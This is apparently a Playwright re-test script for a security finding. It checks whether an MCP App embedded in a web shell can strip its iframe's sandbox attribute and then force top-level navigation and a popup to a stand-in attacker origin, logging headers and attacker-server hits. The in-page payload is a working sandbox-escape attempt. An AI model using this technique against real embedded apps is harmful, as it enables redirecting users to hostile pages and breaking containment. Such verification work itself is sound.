// Self-contained B1 re-test: render the App, capture the sandbox document's HTTP
// response headers, then have the App's OWN script strip its frame's sandbox attribute
// and attempt top-level navigation + a popup to an attacker origin. Fresh page.
const pw = require('playwright'); const fs = require('fs');
const [BROWSER, DP, TOKEN, OUT, VLOG] = process.argv.slice(2);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const vhits = () => (fs.existsSync(VLOG) ? fs.readFileSync(VLOG, 'utf8') : '').split('\n').filter(Boolean).map(JSON.parse).filter(e => /popup|topnav|form/.test(e.url)).map(e => e.url);
(async () => {
  const b = await pw[BROWSER].launch();
  const ctx = await b.newContext({ viewport: { width: 1360, height: 900 }, deviceScaleFactor: 2 });
  const page = await ctx.newPage();
  const sandboxHeaders = [];
  page.on('response', async (r) => {
    if (r.url().includes('/mcp-app-sandbox')) {
      try { sandboxHeaders.push({ url: r.url().slice(0, 90), status: r.status(), csp: r.headers()['content-security-policy'] || null }); } catch {}
    }
  });
  let popupUrl = null; ctx.on('page', p => { p.waitForLoadState().then(() => { popupUrl = p.url(); }).catch(() => {}); });
  await page.goto(`http://127.0.0.1:${DP}/?token=${TOKEN}`);
  const composer = page.locator('[data-web-shell-composer-editor] .cm-content');
  await composer.waitFor({ timeout: 30000 });
  const send = async (text) => { await composer.click(); await page.keyboard.type(text); await page.locator('[data-web-shell-composer-submit]').click(); };
  await send('hello'); await page.getByText('[done:plain]').first().waitFor({ timeout: 60000 });
  await send('show dashboard');
  const panel = page.locator('[data-web-shell-permission-panel]').first();
  await panel.waitFor({ timeout: 30000 });
  await panel.locator('[data-web-shell-permission-option][data-option-id="proceed_once"]').click();
  const card = page.locator('[data-testid="mcp-app"]').first();
  await card.waitFor({ timeout: 60000 });
  await sleep(6000);
  const proxy = await (await card.locator('iframe').elementHandle()).contentFrame();
  let inner; for (let i = 0; i < 40 && !inner; i++) { inner = proxy.childFrames()[0]; if (!inner) await sleep(250); }
  const appOriginBefore = inner ? await inner.evaluate(() => self.origin).catch(e => 'ERR ' + e) : null;
  const before = vhits().length; const url0 = page.url();
  // The App's own script: reach parent (proxy, same-origin), strip the inner iframe's
  // sandbox attribute, then from a freshly srcdoc'd child try popup + top navigation.
  const step = await inner.evaluate(() => {
    try {
      const ifr = parent.document.querySelector('iframe');
      const had = ifr.getAttribute('sandbox');
      ifr.removeAttribute('sandbox');
      ifr.srcdoc = `<script>
        try { window.open('http://127.0.0.1:18701/popup-by-app'); } catch (e) {}
        try { top.location.href = 'http://127.0.0.1:18701/topnav-by-app'; } catch (e) { parent.__err = e.name + ': ' + e.message; }
      <\/script>`;
      return { reachedProxyDom: true, strippedSandboxAttr: had };
    } catch (e) { return { reachedProxyDom: false, err: e.name + ': ' + String(e.message).slice(0, 120) }; }
  }).catch(e => ({ evalErr: String(e).slice(0, 160) }));
  await sleep(4000);
  const innerErr = await inner.evaluate(() => window.__err || null).catch(() => null);
  const res = {
    browser: BROWSER, version: b.version(), daemonPort: Number(DP),
    sandboxDocHeaders: sandboxHeaders,
    appOriginBefore,
    appStep: step,
    topNavExceptionInApp: innerErr,
    topUrlBefore: url0, topUrlAfter: page.url(),
    topNavigatedAway: !page.url().startsWith(`http://127.0.0.1:${DP}/`),
    popupOpened: popupUrl !== null, popupUrl,
    attackerHits: vhits().slice(before),
  };
  console.log(JSON.stringify(res, null, 1));
  fs.writeFileSync(OUT + '.json', JSON.stringify(res, null, 1));
  await page.screenshot({ path: OUT + '.png' });
  await b.close();
})().catch(e => { console.log('FATAL', String(e && e.stack || e).slice(0, 800)); process.exit(1); });
